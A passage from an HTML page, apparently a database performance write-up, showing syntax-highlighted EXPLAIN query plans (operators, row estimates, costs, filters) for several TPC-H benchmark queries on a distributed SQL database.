class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"></span><br><span class="line">Outputs <span class="operator">&amp;</span> filters:</span><br><span class="line"><span class="comment">-------------------------------------</span></span><br><span class="line">  <span class="number">0</span> <span class="operator">-</span> output([nation.n_name], [T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)]), <span class="keyword">filter</span>(nil), sort_keys([T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount), <span class="keyword">DESC</span>])</span><br><span class="line">  <span class="number">1</span> <span class="operator">-</span> output([nation.n_name], [T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      <span class="keyword">group</span>([nation.n_name]), agg_func([T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)])</span><br><span class="line">  <span class="number">2</span> <span class="operator">-</span> output([nation.n_name], [lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([nation.n_regionkey <span class="operator">=</span> region.r_regionkey]), other_conds(nil)</span><br><span class="line">  <span class="number">3</span> <span class="operator">-</span> output([region.r_regionkey]), <span class="keyword">filter</span>([region.r_name <span class="operator">=</span> <span class="string">&#x27;EUROPE&#x27;</span>]),</span><br><span class="line">      access([region.r_regionkey], [region.r_name]), partitions(p0)</span><br><span class="line">  <span class="number">4</span> <span class="operator">-</span> output([nation.n_name], [lineitem.l_extendedprice], [lineitem.l_discount], [nation.n_regionkey]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([supplier.s_nationkey <span class="operator">=</span> nation.n_nationkey]), other_conds(nil)</span><br><span class="line">  <span class="number">5</span> <span class="operator">-</span> output([nation.n_nationkey], [nation.n_regionkey], [nation.n_name]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([nation.n_nationkey], [nation.n_regionkey], [nation.n_name]), partitions(p0)</span><br><span class="line">  <span class="number">6</span> <span class="operator">-</span> output([lineitem.l_extendedprice], [lineitem.l_discount], [supplier.s_nationkey]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([lineitem.l_suppkey <span class="operator">=</span> supplier.s_suppkey], [customer.c_nationkey <span class="operator">=</span> supplier.s_nationkey]), other_conds(nil)</span><br><span class="line">  <span class="number">7</span> <span class="operator">-</span> output([supplier.s_suppkey], [supplier.s_nationkey]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([supplier.s_suppkey], [supplier.s_nationkey]), partitions(p0)</span><br><span class="line">  <span class="number">8</span> <span class="operator">-</span> output([lineitem.l_extendedprice], [lineitem.l_discount], [lineitem.l_suppkey], [customer.c_nationkey]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([lineitem.l_orderkey <span class="operator">=</span> orders.o_orderkey]), other_conds(nil)</span><br><span class="line">  <span class="number">9</span> <span class="operator">-</span> output([customer.c_nationkey], [orders.o_orderkey]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([customer.c_custkey <span class="operator">=</span> orders.o_custkey]), other_conds(nil)</span><br><span class="line">  <span class="number">10</span> <span class="operator">-</span> output([customer.c_custkey], [customer.c_nationkey]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([customer.c_custkey], [customer.c_nationkey]), partitions(p0)</span><br><span class="line">  <span class="number">11</span> <span class="operator">-</span> output([orders.o_custkey], [orders.o_orderkey]), <span class="keyword">filter</span>([orders.o_orderDATE <span class="operator">&gt;=</span> <span class="string">&#x27;1996-01-01&#x27;</span>], [orders.o_orderDATE <span class="operator">&lt;</span> ?]),</span><br><span class="line">      access([orders.o_custkey], [orders.o_orderkey], [orders.o_orderDATE]), partitions(p0)</span><br><span class="line">  <span class="number">12</span> <span class="operator">-</span> output([lineitem.l_orderkey], [lineitem.l_suppkey], [lineitem.l_extendedprice], [lineitem.l_discount]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([lineitem.l_orderkey], [lineitem.l_suppkey], [lineitem.l_extendedprice], [lineitem.l_discount]), partitions(p0)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.035</span> sec)</span><br></pre></td></tr></table></figure></div>
<h4 id="SQL-6">SQL-6</h4>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">Query Plan: <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="operator">|</span>ID<span class="operator">|</span>OPERATOR       <span class="operator">|</span>NAME    <span class="operator">|</span>EST. <span class="keyword">ROWS</span><span class="operator">|</span>COST   <span class="operator">|</span></span><br><span class="line"><span class="comment">-----------------------------------------------</span></span><br><span class="line"><span class="operator">|</span><span class="number">0</span> <span class="operator">|</span>SCALAR <span class="keyword">GROUP</span> <span class="keyword">BY</span><span class="operator">|</span>        <span class="operator">|</span><span class="number">1</span>        <span class="operator">|</span><span class="number">5400125</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">1</span> <span class="operator">|</span> <span class="keyword">TABLE</span> SCAN    <span class="operator">|</span>lineitem<span class="operator">|</span><span class="number">123843</span>   <span class="operator">|</span><span class="number">5376470</span><span class="operator">|</span></span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"></span><br><span class="line">Outputs <span class="operator">&amp;</span> filters:</span><br><span class="line"><span class="comment">-------------------------------------</span></span><br><span class="line">  <span class="number">0</span> <span class="operator">-</span> output([T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> lineitem.l_discount)]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      <span class="keyword">group</span>(nil), agg_func([T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> lineitem.l_discount)])</span><br><span class="line">  <span class="number">1</span> <span class="operator">-</span> output([lineitem.l_extendedprice <span class="operator">*</span> lineitem.l_discount]), <span class="keyword">filter</span>([(T_OP_BTW, lineitem.l_discount, ?, ?)], [lineitem.l_shipDATE <span class="operator">&gt;=</span> <span class="string">&#x27;1996-01-01&#x27;</span>], [lineitem.l_quantity <span class="operator">&lt;</span> ?], [lineitem.l_shipDATE <span class="operator">&lt;</span> ?]),</span><br><span class="line">      access([lineitem.l_shipDATE], [lineitem.l_discount], [lineitem.l_quantity], [lineitem.l_extendedprice]), partitions(p0)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.004</span> sec)</span><br></pre></td></tr></table></figure></div>
<h4 id="SQL-10">SQL-10</h4>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">Query Plan: <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="operator">|</span>ID<span class="operator">|</span>OPERATOR        <span class="operator">|</span>NAME    <span class="operator">|</span>EST. <span class="keyword">ROWS</span><span class="operator">|</span>COST   <span class="operator">|</span></span><br><span class="line"><span class="comment">------------------------------------------------</span></span><br><span class="line"><span class="operator">|</span><span class="number">0</span> <span class="operator">|</span>LIMIT           <span class="operator">|</span>        <span class="operator">|</span><span class="number">20</span>       <span class="operator">|</span><span class="number">9753872</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">1</span> <span class="operator">|</span> TOP<span class="operator">-</span>N SORT     <span class="operator">|</span>        <span class="operator">|</span><span class="number">20</span>       <span class="operator">|</span><span class="number">9753869</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">2</span> <span class="operator">|</span>  HASH <span class="keyword">GROUP</span> <span class="keyword">BY</span> <span class="operator">|</span>        <span class="operator">|</span><span class="number">273659</span>   <span class="operator">|</span><span class="number">8556264</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">3</span> <span class="operator">|</span>   HASH <span class="keyword">JOIN</span>    <span class="operator">|</span>        <span class="operator">|</span><span class="number">273659</span>   <span class="operator">|</span><span class="number">8160619</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">4</span> <span class="operator">|</span>    <span class="keyword">TABLE</span> SCAN  <span class="operator">|</span>nation  <span class="operator">|</span><span class="number">25</span>       <span class="operator">|</span><span class="number">41</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">5</span> <span class="operator">|</span>    HASH <span class="keyword">JOIN</span>   <span class="operator">|</span>        <span class="operator">|</span><span class="number">273659</span>   <span class="operator">|</span><span class="number">7908405</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">6</span> <span class="operator">|</span>     HASH <span class="keyword">JOIN</span>  <span class="operator">|</span>        <span class="operator">|</span><span class="number">279244</span>   <span class="operator">|</span><span class="number">7017068</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">7</span> <span class="operator">|</span>      <span class="keyword">TABLE</span> SCAN<span class="operator">|</span>orders  <span class="operator">|</span><span class="number">166667</span>   <span class="operator">|</span><span class="number">770751</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">8</span> <span class="operator">|</span>      <span class="keyword">TABLE</span> SCAN<span class="operator">|</span>lineitem<span class="operator">|</span><span class="number">2000405</span>  <span class="operator">|</span><span class="number">5172554</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">9</span> <span class="operator">|</span>     <span class="keyword">TABLE</span> SCAN <span class="operator">|</span>customer<span class="operator">|</span><span class="number">150000</span>   <span class="operator">|</span><span class="number">78809</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"></span><br><span class="line">Outputs <span class="operator">&amp;</span> filters:</span><br><span class="line"><span class="comment">-------------------------------------</span></span><br><span class="line">  <span class="number">0</span> <span class="operator">-</span> output([customer.c_custkey], [customer.c_name], [T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)], [customer.c_acctbal], [nation.n_name], [customer.c_address], [customer.c_phone], [customer.c_comment]), <span class="keyword">filter</span>(nil), limit(<span class="number">20</span>), <span class="keyword">offset</span>(nil)</span><br><span class="line">  <span class="number">1</span> <span class="operator">-</span> output([customer.c_custkey], [customer.c_name], [T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)], [customer.c_acctbal], [nation.n_name], [customer.c_address], [customer.c_phone], [customer.c_comment]), <span class="keyword">filter</span>(nil), sort_keys([T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount), <span class="keyword">DESC</span>]), topn(<span class="number">20</span>)</span><br><span class="line">  <span class="number">2</span> <span class="operator">-</span> output([customer.c_custkey], [customer.c_name], [T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)], [customer.c_acctbal], [nation.n_name], [customer.c_address], [customer.c_phone], [customer.c_comment]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      <span class="keyword">group</span>([customer.c_custkey], [customer.c_name], [customer.c_acctbal], [customer.c_phone], [nation.n_name], [customer.c_address], [customer.c_comment]), agg_func([T_FUN_SUM(lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount)])</span><br><span class="line">  <span class="number">3</span> <span class="operator">-</span> output([customer.c_custkey], [customer.c_name], [customer.c_acctbal], [nation.n_name], [customer.c_address], [customer.c_phone], [customer.c_comment], [lineitem.l_extendedprice <span class="operator">*</span> ? <span class="operator">-</span> lineitem.l_discount]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([customer.c_nationkey <span class="operator">=</span> nation.n_nationkey]), other_conds(nil)</span><br><span class="line">  <span class="number">4</span> <span class="operator">-</span> output([nation.n_nationkey], [nation.n_name]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([nation.n_nationkey], [nation.n_name]), partitions(p0)</span><br><span class="line">  <span class="number">5</span> <span class="operator">-</span> output([customer.c_custkey], [customer.c_name], [lineitem.l_extendedprice], [lineitem.l_discount], [customer.c_acctbal], [customer.c_address], [customer.c_phone], [customer.c_comment], [customer.c_nationkey]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([customer.c_custkey <span class="operator">=</span> orders.o_custkey]), other_conds(nil)</span><br><span class="line">  <span class="number">6</span> <span class="operator">-</span> output([lineitem.l_extendedprice], [lineitem.l_discount], [orders.o_custkey]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([lineitem.l_orderkey <span class="operator">=</span> orders.o_orderkey]), other_conds(nil)</span><br><span class="line">  <span class="number">7</span> <span class="operator">-</span> output([orders.o_custkey], [orders.o_orderkey]), <span class="keyword">filter</span>([<span class="built_in">cast</span>(orders.o_orderDATE, DATETIME(<span class="number">-1</span>, <span class="number">-1</span>)) <span class="operator">&gt;=</span> ?], [<span class="built_in">cast</span>(orders.o_orderDATE, DATETIME(<span class="number">-1</span>, <span class="number">-1</span>)) <span class="operator">&lt;</span> ?]),</span><br><span class="line">      access([orders.o_custkey], [orders.o_orderkey], [orders.o_orderDATE]), partitions(p0)</span><br><span class="line">  <span class="number">8</span> <span class="operator">-</span> output([lineitem.l_orderkey], [lineitem.l_extendedprice], [lineitem.l_discount]), <span class="keyword">filter</span>([lineitem.l_returnflag <span class="operator">=</span> <span class="string">&#x27;R&#x27;</span>]),</span><br><span class="line">      access([lineitem.l_orderkey], [lineitem.l_returnflag], [lineitem.l_extendedprice], [lineitem.l_discount]), partitions(p0)</span><br><span class="line">  <span class="number">9</span> <span class="operator">-</span> output([customer.c_custkey], [customer.c_nationkey], [customer.c_name], [customer.c_acctbal], [customer.c_address], [customer.c_phone], [customer.c_comment]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([customer.c_custkey], [customer.c_nationkey], [customer.c_name], [customer.c_acctbal], [customer.c_address], [customer.c_phone], [customer.c_comment]), partitions(p0)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.023</span> sec)</span><br></pre></td></tr></table></figure></div>
<h4 id="SQL-17">SQL-17</h4>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span> <span class="number">1.</span> <span class="type">row</span> <span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span></span><br><span class="line">Query Plan: <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"><span class="operator">|</span>ID<span class="operator">|</span>OPERATOR         <span class="operator">|</span>NAME    <span class="operator">|</span>EST. <span class="keyword">ROWS</span><span class="operator">|</span>COST   <span class="operator">|</span></span><br><span class="line"><span class="comment">-------------------------------------------------</span></span><br><span class="line"><span class="operator">|</span><span class="number">0</span> <span class="operator">|</span>SCALAR <span class="keyword">GROUP</span> <span class="keyword">BY</span>  <span class="operator">|</span>        <span class="operator">|</span><span class="number">1</span>        <span class="operator">|</span><span class="number">4485685</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">1</span> <span class="operator">|</span> SUBPLAN SCAN    <span class="operator">|</span>VIEW1   <span class="operator">|</span><span class="number">2035</span>     <span class="operator">|</span><span class="number">4485296</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">2</span> <span class="operator">|</span>  <span class="keyword">WINDOW</span> <span class="keyword">FUNCTION</span><span class="operator">|</span>        <span class="operator">|</span><span class="number">6104</span>     <span class="operator">|</span><span class="number">4483943</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">3</span> <span class="operator">|</span>   SORT          <span class="operator">|</span>        <span class="operator">|</span><span class="number">6104</span>     <span class="operator">|</span><span class="number">4482777</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">4</span> <span class="operator">|</span>    HASH <span class="keyword">JOIN</span>    <span class="operator">|</span>        <span class="operator">|</span><span class="number">6104</span>     <span class="operator">|</span><span class="number">4464880</span><span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">5</span> <span class="operator">|</span>     <span class="keyword">TABLE</span> SCAN  <span class="operator">|</span>part    <span class="operator">|</span><span class="number">206</span>      <span class="operator">|</span><span class="number">261589</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span><span class="number">6</span> <span class="operator">|</span>     <span class="keyword">TABLE</span> SCAN  <span class="operator">|</span>lineitem<span class="operator">|</span><span class="number">6001215</span>  <span class="operator">|</span><span class="number">2229397</span><span class="operator">|</span></span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line"></span><br><span class="line">Outputs <span class="operator">&amp;</span> filters:</span><br><span class="line"><span class="comment">-------------------------------------</span></span><br><span class="line">  <span class="number">0</span> <span class="operator">-</span> output([T_FUN_SUM(VIEW1.lineitem.l_extendedprice) <span class="operator">/</span> <span class="number">7.0</span>]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      <span class="keyword">group</span>(nil), agg_func([T_FUN_SUM(VIEW1.lineitem.l_extendedprice)])</span><br><span class="line">  <span class="number">1</span> <span class="operator">-</span> output([VIEW1.lineitem.l_extendedprice]), <span class="keyword">filter</span>([VIEW1.lineitem.l_quantity <span class="operator">&lt;</span> VIEW1<span class="number">.0</span><span class="number">.2</span> <span class="operator">*</span> <span class="built_in">avg</span>(l_quantity)]),</span><br><span class="line">      access([VIEW1<span class="number">.0</span><span class="number">.2</span> <span class="operator">*</span> <span class="built_in">avg</span>(l_quantity)], [VIEW1.lineitem.l_quantity], [VIEW1.lineitem.l_extendedprice])</span><br><span class="line">  <span class="number">2</span> <span class="operator">-</span> output([<span class="number">0.2</span> <span class="operator">*</span> T_FUN_SUM(lineitem.l_quantity) <span class="operator">/</span> <span class="built_in">cast</span>(T_FUN_COUNT(lineitem.l_quantity), <span class="type">DECIMAL</span>(<span class="number">20</span>, <span class="number">0</span>))], [lineitem.l_quantity], [lineitem.l_extendedprice]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      win_expr(T_FUN_SUM(lineitem.l_quantity)), partition_by([part.__pk_increment]), order_by(nil), window_type(<span class="keyword">RANGE</span>), <span class="built_in">upper</span>(UNBOUNDED PRECEDING), <span class="built_in">lower</span>(UNBOUNDED FOLLOWING)</span><br><span class="line">      win_expr(T_FUN_COUNT(lineitem.l_quantity)), partition_by([part.__pk_increment]), order_by(nil), window_type(<span class="keyword">RANGE</span>), <span class="built_in">upper</span>(UNBOUNDED PRECEDING), <span class="built_in">lower</span>(UNBOUNDED FOLLOWING)</span><br><span class="line">  <span class="number">3</span> <span class="operator">-</span> output([lineitem.l_quantity], [part.__pk_increment], [lineitem.l_extendedprice]), <span class="keyword">filter</span>(nil), sort_keys([part.__pk_increment, <span class="keyword">ASC</span>])</span><br><span class="line">  <span class="number">4</span> <span class="operator">-</span> output([lineitem.l_quantity], [part.__pk_increment], [lineitem.l_extendedprice]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      equal_conds([part.p_partkey <span class="operator">=</span> lineitem.l_partkey]), other_conds(nil)</span><br><span class="line">  <span class="number">5</span> <span class="operator">-</span> output([part.p_partkey], [part.__pk_increment]), <span class="keyword">filter</span>([part.p_container <span class="operator">=</span> <span class="string">&#x27;WRAP DRUM&#x27;</span>], [part.p_brand <span class="operator">=</span> <span class="string">&#x27;Brand#43&#x27;</span>]),</span><br><span class="line">      access([part.p_partkey], [part.p_brand], [part.p_container], [part.__pk_increment]), partitions(p0)</span><br><span class="line">  <span class="number">6</span> <span class="operator">-</span> output([lineitem.l_partkey], [lineitem.l_quantity], [lineitem.l_extendedprice]), <span class="keyword">filter</span>(nil),</span><br><span class="line">      access([lineitem.l_partkey], [lineitem.l_quantity], [lineitem.l_extendedprice]), partitions(p0)</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.014</span> sec)</span><br></pre></td></tr></table></figure></div>
<h4 id="SQL-18">SQL-18</h4>
